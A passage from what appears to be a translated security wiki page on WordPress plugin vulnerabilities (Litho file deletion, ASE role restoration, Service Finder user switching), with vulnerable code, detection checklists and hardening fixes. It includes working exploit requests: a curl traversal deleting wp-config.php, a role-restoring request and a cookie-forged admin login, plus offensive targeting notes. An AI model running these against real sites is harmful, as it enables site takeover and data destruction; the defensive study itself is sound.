- –ù—ñ–∫–æ–ª–∏ –Ω–µ –≤–∏–≤–æ–¥—å—Ç–µ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∞–±–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∑ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–æ–º.
- –Ø–∫—â–æ reverse proxy –º–∞—î —ñ–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å, –ø—Ä–∏–ø–∏–Ω—ñ—Ç—å –¥–æ–≤—ñ—Ä—É –Ω–∞ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –≤–∏–¥–∞–ª—ñ—Ç—å –≤—Ö—ñ–¥–Ω—ñ –∫–æ–ø—ñ—ó (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `unset X-Wcpay-Platform-Checkout-User` –Ω–∞ –º–µ–∂—ñ), –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Ç–æ–∫–µ–Ω —ñ –≤–∞–ª—ñ–¥—É–π—Ç–µ –π–æ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.
- –î–ª—è REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó, –≤–∏–º–∞–≥–∞—é—Ç—å—Å—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ `current_user_can()` —ñ —Å—Ç—Ä–æ–≥–∏–π `permission_callback` (–ù–ï –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `__return_true`).
- –í—ñ–¥–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –ø–µ—Ä—à–æ–∫–ª–∞—Å–Ω—ñ–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (cookies, application passwords, OAuth) –∑–∞–º—ñ—Å—Ç—å —ñ–º–ø–µ—Ä—Å–æ–Ω–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∏.

References: see the links at the end of this page for a public case and broader analysis.

### –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–µ –¥–æ–≤—ñ–ª—å–Ω–µ –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ —á–µ—Ä–µ–∑ wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–∏–∫–ª–∏–∫–∞–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

* **–ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** ‚Äì –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ —Ö—É–∫ `wp_ajax_nopriv_`.
* **–í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce / capability** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ endpoint.
* **–ù–µ–º–∞—î —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó —à–ª—è—Ö—É** ‚Äì —Ä—è–¥–æ–∫ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `fontfamily` –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –∑ —Ñ–∞–π–ª–æ–≤–∏–º —à–ª—è—Ö–æ–º –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–ª–∞—Å–∏—á–Ω–∏–π `../../` traversal.

#### Exploitation

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥ **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É uploads** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`) –≤—ñ–¥–ø—Ä–∞–≤–∏–≤—à–∏ –æ–¥–∏–Ω HTTP POST-–∑–∞–ø–∏—Ç:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
–û—Å–∫—ñ–ª—å–∫–∏ `wp-config.php` –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ –º–µ–∂–∞–º–∏ *uploads*, –Ω–∞ —Ç–∏–ø–æ–≤—ñ–π —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —á–æ—Ç–∏—Ä—å–æ—Ö –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç–µ–π `../`. –í–∏–¥–∞–ª–µ–Ω–Ω—è `wp-config.php` –ø–µ—Ä–µ–≤–µ–¥–µ WordPress –ø—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—ñ –≤ *–º–∞–π—Å—Ç–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è*, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–µ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–∞–π—Ç—É (–∞—Ç–∞–∫—É—é—á–∏–π –ª–∏—à–µ –Ω–∞–¥–∞—î –Ω–æ–≤—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —ñ —Å—Ç–≤–æ—Ä—é—î –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).

–Ü–Ω—à—ñ –∑–Ω–∞—á—É—â—ñ —Ü—ñ–ª—ñ –≤–∫–ª—é—á–∞—é—Ç—å —Ñ–∞–π–ª–∏ –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º `.php` (—â–æ–± –ø–æ—Ä—É—à–∏—Ç–∏ —Ä–æ–±–æ—Ç—É –ø–ª–∞–≥—ñ–Ω—ñ–≤ –±–µ–∑–ø–µ–∫–∏) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### Detection checklist

* –ë—É–¥—å-—è–∫–∏–π callback `add_action( 'wp_ajax_nopriv_...')`, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î —Ñ–∞–π–ª–æ–≤—ñ —Ö–µ–ª–ø–µ—Ä–∏ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ–Ω–∞–ª–µ–∂–Ω–æ –æ—á–∏—â–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

#### –ü–æ—Å–∏–ª–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **–ó–∞–≤–∂–¥–∏** –≤–≤–∞–∂–∞–π—Ç–µ –±—É–¥—å-—è–∫—É –æ–ø–µ—Ä–∞—Ü—ñ—é –∑–∞–ø–∏—Å—É/–≤–∏–¥–∞–ª–µ–Ω–Ω—è –Ω–∞ –¥–∏—Å–∫—É –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ—é —Ç–∞ –¥–≤—ñ—á—ñ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ:
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

–ë–∞–≥–∞—Ç–æ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é "view as role" –∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤—É –∑–º—ñ–Ω—É —Ä–æ–ª—ñ, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—å(—ñ) –≤ user meta, —â–æ–± –ø—ñ–∑–Ω—ñ—à–µ —ó—Ö –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏. –Ø–∫—â–æ —à–ª—è—Ö –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –ª–∏—à–µ –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `$_REQUEST['reset-for']`) —ñ –Ω–∞ —Å–ø–∏—Å–æ–∫, —è–∫–∏–π –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–ª–∞–≥—ñ–Ω, –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capabilities —ñ –≤–∞–ª—ñ–¥–Ω–æ–≥–æ nonce, —Ü–µ —Å—Ç–∞—î vertical privilege escalation.

–†–µ–∞–ª—å–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ —É –ø–ª–∞–≥—ñ–Ω—ñ Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). –ì—ñ–ª–∫–∞ reset –≤—ñ–¥–Ω–æ–≤–ª—é–≤–∞–ª–∞ —Ä–æ–ª—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ `reset-for=<username>` —è–∫—â–æ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑'—è–≤–ª—è–ª–æ—Å—è —É –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É –º–∞—Å–∏–≤—ñ `$options['viewing_admin_as_role_are']`, –∞–ª–µ –Ω–µ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞ –Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ `current_user_can()`, –Ω—ñ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—ó nonce –ø–µ—Ä–µ–¥ –≤–∏–¥–∞–ª–µ–Ω–Ω—è–º –ø–æ—Ç–æ—á–Ω–∏—Ö —Ä–æ–ª–µ–π —ñ –ø–æ–≤—Ç–æ—Ä–Ω–∏–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —Ä–æ–ª–µ–π –∑ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –î–æ–≤—ñ—Ä—è—î `$_REQUEST['reset-for']` —Ç–∞ –æ–ø—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ –±–µ–∑ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞.
- –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–∞–Ω—ñ—à–µ –º–∞–≤ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ `_asenha_view_admin_as_original_roles`, —ñ –±—É–≤ –ø–æ–Ω–∏–∂–µ–Ω–∏–π, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ —à–ª—è—Ö—É —Å–∫–∏–¥–∞–Ω–Ω—è.
- –£ –¥–µ—è–∫–∏—Ö —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è—Ö –±—É–¥—å-—è–∫–∏–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º—ñ–≥ –±–∏ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–µ –≤—Å–µ —â–µ –ø—Ä–∏—Å—É—Ç–Ω—î –≤ `viewing_admin_as_role_are` (–ø–æ—à–∫–æ–¥–∂–µ–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è).

Attack prerequisites

- –í—Ä–∞–∑–ª–∏–≤–∞ –≤–µ—Ä—Å—ñ—è –ø–ª–∞–≥—ñ–Ω–∞ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é.
- –¶—ñ–ª—å–æ–≤–∏–π –∞–∫–∞—É–Ω—Ç –º–∞—î –∑–∞—Å—Ç–∞—Ä—ñ–ª—É —Ä–æ–ª—å –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏, –∑–±–µ—Ä–µ–∂–µ–Ω—É –≤ user meta –≤—ñ–¥ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.
- –ë—É–¥—å-—è–∫–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ —Å–µ—Å—ñ—è; –≤—ñ–¥—Å—É—Ç–Ω—ñ–π nonce/capability —É –ø–æ—Ç–æ—Ü—ñ —Å–∫–∏–¥–∞–Ω–Ω—è.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–ø—Ä–∏–∫–ª–∞–¥)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
–ù–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∑–±—ñ—Ä–∫–∞—Ö —Ü–µ –≤–∏–¥–∞–ª—è—î –ø–æ—Ç–æ—á–Ω—ñ —Ä–æ–ª—ñ —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –¥–æ–¥–∞—î –∑–±–µ—Ä–µ–∂–µ–Ω—ñ ¬´original roles¬ª (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `administrator`), —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

Detection checklist

- –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è —Ä–æ–ª–µ–π, —â–æ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å ¬´original roles¬ª –≤ user meta (e.g., `_asenha_view_admin_as_original_roles`).
- –í–∏–∑–Ω–∞—á—Ç–µ —à–ª—è—Ö–∏ —Å–∫–∏–¥–∞–Ω–Ω—è/–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è, —è–∫—ñ:
- –ß–∏—Ç–∞—é—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ `$_REQUEST` / `$_GET` / `$_POST`.
- –ó–º—ñ–Ω—é—é—Ç—å —Ä–æ–ª—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `add_role()` / `remove_role()` –±–µ–∑ `current_user_can()` —ñ `wp_verify_nonce()` / `check_admin_referer()`.
- –ê–≤—Ç–æ—Ä–∏–∑—É—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º–∞—Å–∏–≤—É –æ–ø—Ü—ñ–π –ø–ª–∞–≥—ñ–Ω–∞ (e.g., `viewing_admin_as_role_are`) –∑–∞–º—ñ—Å—Ç—å –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π –∞–∫—Ç–æ—Ä–∞.

Hardening

- –ü—Ä–∏–º—É—Å–æ–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤ –∫–æ–∂–Ω–æ–º—É –±–ª–æ—Ü—ñ, —â–æ –∑–º—ñ–Ω—é—î —Å—Ç–∞–Ω (e.g., `current_user_can('manage_options')` or stricter).
- –í–∏–º–∞–≥–∞–π—Ç–µ nonces –¥–ª—è –≤—Å—ñ—Ö –∑–º—ñ–Ω —Ä–æ–ª–µ–π/–¥–æ–∑–≤–æ–ª—ñ–≤ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ —ó—Ö: `check_admin_referer()` / `wp_verify_nonce()`.
- –ù—ñ–∫–æ–ª–∏ –Ω–µ –¥–æ–≤—ñ—Ä—è–π—Ç–µ —ñ–º–µ–Ω–∞–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –æ—Ç—Ä–∏–º–∞–Ω–∏–º —ñ–∑ –∑–∞–ø–∏—Ç—É; –≤–∏–∑–Ω–∞—á–∞–π—Ç–µ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∞–∫—Ç–æ—Ä–∞ —Ç–∞ —á—ñ—Ç–∫–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏.
- –ê–Ω—É–ª—é–π—Ç–µ —Å—Ç–∞–Ω ¬´original roles¬ª –ø—Ä–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è—Ö –ø—Ä–æ—Ñ—ñ–ª—é/—Ä–æ–ª–µ–π, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏—Ö –≤–∏—Å–æ–∫–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ —Å—Ç–∞–Ω—É —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —á–∞—Å–æ–≤–æ-–æ–±–º–µ–∂–µ–Ω–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ —ñ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é capability –¥–ª—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω—å —Ä–æ–ª–µ–π.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –ø—Ä–∏–≤'—è–∑—É—é—Ç—å —Ö–µ–ª–ø–µ—Ä–∏ –¥–ª—è –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ —Ö—É–∫—É `init` —ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è cookie, —â–æ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç–æ–º. –Ø–∫—â–æ –∫–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î `wp_set_auth_cookie()` –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, capability —Ç–∞ –¥—ñ–π—Å–Ω–æ–≥–æ nonce, –±—É–¥—å-—è–∫–∏–π –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –ø—Ä–∏–º—É—Å–æ–≤–æ —É–≤—ñ–π—Ç–∏ –ø—ñ–¥ –¥–æ–≤—ñ–ª—å–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.

–¢–∏–ø–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π —à–∞–±–ª–æ–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ –∑ Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
–ß–æ–º—É —Ü–µ –≤—Ä–∞–∑–ª–∏–≤–µ

- –ü—É–±–ª—ñ—á–Ω–∏–π —Ö—É–∫ `init` —Ä–æ–±–∏—Ç—å –æ–±—Ä–æ–±–Ω–∏–∫ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–µ–º–∞—î –∑–∞—Ö–∏—Å—Ç—É `is_user_logged_in()`).
- –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –ø–æ—Ö–æ–¥–∏—Ç—å —ñ–∑ cookie, —è–∫–µ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞ –∫–ª—ñ—î–Ω—Ç—ñ (`original_user_id`).
- –ü—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫ `wp_set_auth_cookie($uid)` –∑–∞–ª–æ–≥—ñ–Ω—é—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability/nonce.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

–ó–∞–≥–∞–ª—å–Ω—ñ edge/server WAFs –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ —à–∏—Ä–æ–∫—ñ –ø–∞—Ç–µ—Ä–Ω–∏ (SQLi, XSS, LFI). –ë–∞–≥–∞—Ç–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –≤–∏—Å–æ–∫–æ–≥–æ –≤–ø–ª–∏–≤—É –≤ WordPress/plugin ‚Äî —Ü–µ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –¥–æ–¥–∞—Ç–∫–∞ logic/auth bugs, —è–∫—ñ –≤–∏–≥–ª—è–¥–∞—é—Ç—å —è–∫ –±–µ–∑–ø–µ—á–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫, —è–∫—â–æ –¥–≤–∏–∂–æ–∫ –Ω–µ —Ä–æ–∑—É–º—ñ—î –º–∞—Ä—à—Ä—É—Ç–∏ WordPress —ñ —Å–µ–º–∞–Ω—Ç–∏–∫—É –ø–ª–∞–≥—ñ–Ω—ñ–≤.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

